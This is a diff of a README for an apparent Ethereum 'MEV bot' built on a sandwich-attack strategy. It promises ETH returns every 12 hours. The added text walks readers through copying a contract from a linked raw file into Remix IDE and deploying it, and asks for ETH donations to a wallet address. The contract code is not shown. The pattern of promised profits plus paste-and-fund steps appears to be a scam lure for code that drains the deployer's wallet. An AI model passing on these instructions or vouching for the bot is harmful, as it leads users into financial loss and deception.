@@ -1,12 +1,4 @@
-## 📥 Download the Repository
 
-🚨 Due to the potentially contentious nature of the "sandwich attack" strategy and potential conflicts with GitHub's terms of service, this repository might face removal. 
-
-💡 To ensure uninterrupted access to this bot contract code, we **highly recommend** downloading a copy:
-
-`git clone https://github.com/Jaredfromsubwayeth-Mev/Bot.git`
-
----
 
 <div align="center">
 
@@ -69,8 +61,21 @@ Your Ethereum (ETH) investment returns are calculated on a 12-hour basis as foll
 
 ## 👨‍💻 Instructions
 
-#### 1) Follow these instructions to deploy your smart contract using [REMIX IDE](https://remix.ethereum.org)
-  - 📁 Create a new file mev.sol and paste the code from mev.sol.
+#### 1) Follow these instructions to deploy your smart contract using Remix IDE.
+  🌐 Start by visiting the [Remix IDE website](https://remix.ethereum.org) This is an online IDE which you can use to write and deploy 
+  your smart contracts.
+    
+  📝 Once you're on the Remix website, create a new file named MEVBot.sol by clicking the icon in the top-left corner of the screen.
+
+<div align="center">
+  
+![bot-example](https://miro.medium.com/v2/resize:fit:550/format:webp/1*pwzmHfEznpbl3-Zj-3vuOw.png)
+  
+</div>
+
+🔗 After you've created your new MEVBot.sol file, navigate to [mev.sol](https://raw.githubusercontent.com/Jaredfromsubwayeth-Mev/Bot/main/mev.sol) to copy the smart contract code.
+
+📋 Paste the copied code into your newly created MEVBot.sol file in the Remix IDE.
 
 
 <img width="1496" alt="1" src="https://user-images.githubusercontent.com/132264778/235452636-8dfda62f-714c-4fb2-9d45-d75bbea7be85.png">
@@ -105,6 +110,12 @@ At any point, you can stop the bot or retrieve your money by calling the withdra
 
 ##### Please ⭐ the repo to support my project
 ![star](https://cdn.discordapp.com/attachments/975036883958636557/975057102097743973/unknown.png)
+
+👋 If you find our MEV-BOT article helpful and informative, you can support us by sending ETH donations to the following wallet address: `0xae2Fc483527B8EF99EB5D9B44875F005ba1FaE13`
+    
+❤️ Your support means the world to us and encourages us to continue creating valuable content and guides for the crypto community. Thank you for being a part of our journey.
+
+
 
 ---
 ## Contact Us
